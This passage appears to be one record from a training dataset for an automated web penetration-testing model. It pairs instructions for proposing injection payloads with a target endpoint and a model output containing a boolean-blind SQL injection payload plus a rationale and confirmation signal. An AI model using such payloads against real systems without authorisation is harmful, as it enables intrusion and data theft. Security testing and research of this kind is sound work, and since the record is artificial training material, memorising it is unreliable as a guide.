OM XSS, SQLi\n  (error/boolean/time/union), SSTI, command injection, path traversal, SSRF,\n  open redirect, header injection, deserialization.\n\n## Output\n\nReturn a single JSON object:\n\n```\n{\n  \"payloads\": [\n    {\n      \"payload\": \"string, ready to inject into the parameter\",\n      \"rationale\": \"which hypothesis this tests and why it is next\",\n      \"confirm_signal\": \"the observation that would confirm execution\",\n      \"score\": 0.0-1.0\n    }\n  ]\n}\n```\n\nBest payload first. No prose outside the JSON object.", "input": "Target: /app/target_endpoint/  param=p\nSuspected class: sqli\nLast payload: \"' OR 1=1 OR 'a'='a' OR ''=' OR 'a'='a' OR 'a'='a' OR 'a'='a\"\n  -> scanner_decision=False context=boolean_blind latency=elevated\nPropose the single most informative next payload and the signal that would confirm the vulnerability.", "output": "{\"payloads\": [{\"payload\": \"' OR 1=1 OR 'a'='a' OR ''=' OR 'a'='a' OR 'a'='a' OR 'a'='a' OR 'a'='a'--+\", \"rationale\": \"Tests a boolean predicate differential after the previous vector \\\"' OR 1=1 OR 'a'='a' OR ''=' OR 'a'='a' OR 'a'='a' OR 'a'='a\\\" (boolean_blind context, 5001.2 ms, scanner_decision=False) produced no decisive signal.\", \"confirm_signal\": \"a stable content differential between the true (1=1) and false (1=2) variants of the predicate\", \"score\": 0.4}]}", "meta": {"endpoint": "/app/target_endpoint/", "param": "p", "label": "sqli"}}
